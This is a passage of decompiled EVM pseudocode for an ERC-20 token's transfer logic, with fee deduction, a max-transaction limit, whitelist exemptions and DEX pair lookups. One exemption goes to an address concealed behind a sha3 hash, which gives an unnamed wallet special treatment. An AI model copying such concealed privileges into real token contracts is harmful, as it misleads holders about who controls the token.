                            revert with ext_call.return_data[0 len return_data.size]
                        _7233 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7265 = mem[_7233]
                        require mem[_7233] == mem[_7233 + 12 len 20]
                        mem[mem[64] + 4] = this.address
                        mem[mem[64] + 36] = address(_7265)
                        require ext_code.size(address(_7185))
                        staticcall address(_7185).getPair(address arg1, address arg2) with:
                                gas gas_remaining wei
                               args address(this.address), address(_7265)
                        mem[mem[64]] = ext_call.return_data[0]
                        if not ext_call.success:
                            revert with ext_call.return_data[0 len return_data.size]
                        _7431 = mem[64]
                        mem[64] = mem[64] + ceil32(return_data.size)
                        require return_data.size >= 32
                        _7503 = mem[_7431]
                        require mem[_7431] == mem[_7431 + 12 len 20]
                        if mem[_7431 + 12 len 20] != msg.sender:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7871 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7871 + 32 len mem[_7871]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if msg.sender == address(_7503):
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
                        else:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                            else:
                                mem[0] = arg1
                                mem[32] = 16
                                if stor16[address(arg1)]:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(arg2, msg.sender, arg1);
                                else:
                                    mem[mem[64] + 32] = address(arg1)
                                    _7903 = mem[64]
                                    mem[mem[64]] = 20
                                    mem[64] = mem[64] + 52
                                    if sha3(mem[_7903 + 32 len mem[_7903]]) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                        if arg2 < 0:
                                            revert with 'NH{q', 17
                                        if balanceOf[0] > -1:
                                            revert with 'NH{q', 17
                                        if balanceOf[address(msg.sender)] < arg2:
                                            revert with 'NH{q', 17
                                        balanceOf[address(msg.sender)] -= arg2
                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                            revert with 'NH{q', 17
                                        balanceOf[address(arg1)] += arg2
                                        emit Transfer(arg2, msg.sender, arg1);
                                    else:
                                        if arg1 == this.address:
                                            if arg2 < 0:
                                                revert with 'NH{q', 17
                                            if balanceOf[0] > -1:
                                                revert with 'NH{q', 17
                                            if balanceOf[address(msg.sender)] < arg2:
                                                revert with 'NH{q', 17
                                            balanceOf[address(msg.sender)] -= arg2
                                            if balanceOf[address(arg1)] > -arg2 - 1:
                                                revert with 'NH{q', 17
                                            balanceOf[address(arg1)] += arg2
                                            emit Transfer(arg2, msg.sender, arg1);
                                        else:
                                            if stor16[address(arg1)]:
                                                if arg2 < 0:
                                                    revert with 'NH{q', 17
                                                if balanceOf[0] > -1:
                                                    revert with 'NH{q', 17
                                                if balanceOf[address(msg.sender)] < arg2:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(msg.sender)] -= arg2
                                                if balanceOf[address(arg1)] > -arg2 - 1:
                                                    revert with 'NH{q', 17
                                                balanceOf[address(arg1)] += arg2
                                                emit Transfer(arg2, msg.sender, arg1);
                                            else:
                                                if stor18:
                                                    if arg2 < 0:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[0] > -1:
                                                        revert with 'NH{q', 17
                                                    if balanceOf[address(msg.sender)] < arg2:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(msg.sender)] -= arg2
                                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                                        revert with 'NH{q', 17
                                                    balanceOf[address(arg1)] += arg2
                                                    emit Transfer(arg2, msg.sender, arg1);
                                                else:
                                                    if not arg2:
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < 0:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -1:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] += arg2
                                                        emit Transfer(arg2, msg.sender, arg1);
                                                    else:
                                                        if arg2 and _fee > -1 / arg2:
                                                            revert with 'NH{q', 17
                                                        if not arg2:
                                                            revert with 'NH{q', 18
                                                        if arg2 * _fee / arg2 != _fee:
                                                            revert with 0, 'SafeMath: multiplication overflow'
                                                        require arg2 <= _maxTxAmount
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).factory() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(stor20.field_8))
                                                        staticcall address(stor20.field_8).WETH() with:
                                                                gas gas_remaining wei
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        require ext_code.size(address(ext_call.return_data[0]))
                                                        staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                                                gas gas_remaining wei
                                                               args address(this.address), address(ext_call.return_data[0])
                                                        if not ext_call.success:
                                                            revert with ext_call.return_data[0 len return_data.size]
                                                        require return_data.size >= 32
                                                        require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                                        if ext_call.return_data[12 len 20] != arg1:
                                                            stor19.length++
                                                            stor19[stor19.length].field_0 = arg1
                                                            stor19[stor19.length].field_256 = arg2
                                                        if arg2 < arg2 * _fee / 100:
                                                            revert with 'NH{q', 17
                                                        if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[0] += arg2 * _fee / 100
                                                        if balanceOf[address(msg.sender)] < arg2:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(msg.sender)] -= arg2
                                                        if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                                            revert with 'NH{q', 17
                                                        balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                                        emit Transfer((arg2 - (arg2 * _fee / 100)), msg.sender, arg1);
                                                        if arg2 * _fee / 100 > 0:
                                                            emit Transfer((arg2 * _fee / 100), msg.sender, 0);
            else:
                mem[32] = 13
                require balanceOf[address(msg.sender)] >= arg2
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).factory() with:
                        gas gas_remaining wei
                mem[96] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                require ext_code.size(address(stor20.field_8))
                staticcall address(stor20.field_8).WETH() with:
                        gas gas_remaining wei
                mem[ceil32(return_data.size) + 96] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                mem[(2 * ceil32(return_data.size)) + 100] = this.address
                mem[(2 * ceil32(return_data.size)) + 132] = address(ext_call.return_data[0])
                require ext_code.size(address(ext_call.return_data[0]))
                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                        gas gas_remaining wei
                       args address(this.address), address(ext_call.return_data[0])
                mem[(2 * ceil32(return_data.size)) + 96] = ext_call.return_data[0]
                if not ext_call.success:
                    revert with ext_call.return_data[0 len return_data.size]
                mem[64] = (4 * ceil32(return_data.size)) + 96
                require return_data.size >= 32
                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                if ext_call.return_data[12 len 20] != msg.sender:
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if arg1 == ext_call.return_data[12 len 20]:
                        if stor16[address(msg.sender)]:
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(arg1)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if arg1 == this.address:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor16[address(msg.sender)]:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if stor18:
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(arg2, msg.sender, arg1);
                                return 1
                            if not arg2:
                                require arg2 <= _maxTxAmount
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 212] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 212] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 216 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 216] = this.address
                                mem[(12 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 280 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < 0:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -1:
                                        revert with 'NH{q', 17
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] += arg2
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2,
                                                  mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor19[stor19.length].field_256 = arg2
                                if arg2 < 0:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -1:
                                    revert with 'NH{q', 17
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] += arg2
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2,
                                              mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                            else:
                                if arg2 and _fee > -1 / arg2:
                                    revert with 'NH{q', 17
                                if not arg2:
                                    revert with 'NH{q', 18
                                if arg2 * _fee / arg2 != _fee:
                                    revert with 0, 'SafeMath: multiplication overflow'
                                require arg2 <= _maxTxAmount
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).factory() with:
                                        gas gas_remaining wei
                                mem[(8 * ceil32(return_data.size)) + 212] = ext_call.return_data[0]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(10 * ceil32(return_data.size)) + 212] = 0xad5c464800000000000000000000000000000000000000000000000000000000
                                require ext_code.size(address(stor20.field_8))
                                staticcall address(stor20.field_8).WETH() with:
                                        gas gas_remaining wei
                                       args mem[(10 * ceil32(return_data.size)) + 216 len 16 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                mem[(12 * ceil32(return_data.size)) + 216] = this.address
                                mem[(12 * ceil32(return_data.size)) + 248] = address(ext_call.return_data[0])
                                require ext_code.size(address(ext_call.return_data[0]))
                                staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                                        gas gas_remaining wei
                                       args address(this.address), address(ext_call.return_data[0]), mem[(12 * ceil32(return_data.size)) + 280 len 20 * ceil32(return_data.size)]
                                if not ext_call.success:
                                    revert with ext_call.return_data[0 len return_data.size]
                                require return_data.size >= 32
                                require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                                if ext_call.return_data[12 len 20] == arg1:
                                    if arg2 < arg2 * _fee / 100:
                                        revert with 'NH{q', 17
                                    if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[0] += arg2 * _fee / 100
                                    if balanceOf[address(msg.sender)] < arg2:
                                        revert with 'NH{q', 17
                                    balanceOf[address(msg.sender)] -= arg2
                                    if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                        revert with 'NH{q', 17
                                    balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 - (arg2 * _fee / 100),
                                                  mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  arg1,
                                    if arg2 * _fee / 100 > 0:
                                        emit Transfer(address arg1, address arg2, uint256 arg3):
                                                      arg2 * _fee / 100,
                                                      mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)],
                                                      msg.sender,
                                                      0,
                                    return 1, mem[(14 * ceil32(return_data.size)) + 244 len 24 * ceil32(return_data.size)]
                                stor19.length++
                                stor19[stor19.length].field_0 = arg1
                                stor19[stor19.length].field_256 = arg2
                                if arg2 < arg2 * _fee / 100:
                                    revert with 'NH{q', 17
                                if balanceOf[0] > -(arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[0] += arg2 * _fee / 100
                                if balanceOf[address(msg.sender)] < arg2:
                                    revert with 'NH{q', 17
                                balanceOf[address(msg.sender)] -= arg2
                                if balanceOf[address(arg1)] > -arg2 + (arg2 * _fee / 100) - 1:
                                    revert with 'NH{q', 17
                                balanceOf[address(arg1)] = balanceOf[address(arg1)] + arg2 - (arg2 * _fee / 100)
                                emit Transfer(address arg1, address arg2, uint256 arg3):
                                              arg2 - (arg2 * _fee / 100),
                                              mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)],
                                              msg.sender,
                                              arg1,
                                if arg2 * _fee / 100 > 0:
                                    emit Transfer(address arg1, address arg2, uint256 arg3):
                                                  arg2 * _fee / 100,
                                                  mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)],
                                                  msg.sender,
                                                  0,
                            return 1, mem[(14 * ceil32(return_data.size)) + 308 len 24 * ceil32(return_data.size)]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).factory() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(stor20.field_8))
                    staticcall address(stor20.field_8).WETH() with:
                            gas gas_remaining wei
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    require ext_code.size(address(ext_call.return_data[0]))
                    staticcall address(ext_call.return_data[0]).getPair(address arg1, address arg2) with:
                            gas gas_remaining wei
                           args address(this.address), address(ext_call.return_data[0])
                    if not ext_call.success:
                        revert with ext_call.return_data[0 len return_data.size]
                    require return_data.size >= 32
                    require ext_call.return_data[0] == ext_call.return_data[12 len 20]
                    if stor16[address(msg.sender)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if stor16[address(arg1)]:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if sha3(arg1) == 0x4342ccd4d128d764dd8019fa67e2a1577991c665a74d1acfdc2ccdcae89bd2ba:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
                        emit Transfer(arg2, msg.sender, arg1);
                        return 1
                    if arg1 == this.address:
                        if arg2 < 0:
                            revert with 'NH{q', 17
                        if balanceOf[0] > -1:
                            revert with 'NH{q', 17
                        if balanceOf[address(msg.sender)] < arg2:
                            revert with 'NH{q', 17
                        balanceOf[address(msg.sender)] -= arg2
                        if balanceOf[address(arg1)] > -arg2 - 1:
                            revert with 'NH{q', 17
                        balanceOf[address(arg1)] += arg2
